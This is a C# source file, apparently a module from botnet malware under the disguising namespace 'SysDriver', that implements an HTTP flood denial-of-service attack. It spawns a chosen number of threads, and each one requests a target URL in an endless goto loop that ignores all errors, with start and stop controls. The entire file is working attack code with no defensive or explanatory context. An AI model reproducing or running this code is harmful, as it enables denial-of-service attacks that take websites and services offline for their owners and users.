using System;
using System.Net;
using System.Threading;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    internal class nHTTPFlood
    {
        private static ThreadStart[] tFloodingJob;
        private static Thread[] tFloodingThread;
        public static string sFHost;
        private static HTTPRequest[] hRequestClass;
        public static int iThreads;

        public static void StartHTTPFlood()
        {
            tFloodingThread = new Thread[iThreads];
            tFloodingJob = new ThreadStart[iThreads];
            hRequestClass = new HTTPRequest[iThreads];

            if (!sFHost.StartsWith("http://")) { sFHost = "http://" + sFHost; }

            for (int i = 0; i < iThreads; i++)
            {
                hRequestClass[i] = new HTTPRequest(sFHost);
                tFloodingJob[i] = new ThreadStart(hRequestClass[i].Send);
                tFloodingThread[i] = new Thread(tFloodingJob[i]);
                tFloodingThread[i].Start();
            }
        }

        public static void StopHTTPFlood()
        {
            for (int i = 0; i < iThreads; i++)
            {
                try
                {
                    tFloodingThread[i].Abort();
                    tFloodingThread[i].Join();
                }
                catch { }
            }
        }

        private class HTTPRequest
        {
            private string sFHost;
            private WebClient wHTTP = new WebClient();

            public HTTPRequest(string tHost)
            {
                this.sFHost = tHost;
            }

            public void Send()
            {
            Label:
                try
                {
                    this.wHTTP.DownloadString(this.sFHost);
                    goto Label;
                }
                catch
                {
                    goto Label;
                }
            }
        }
    }
}

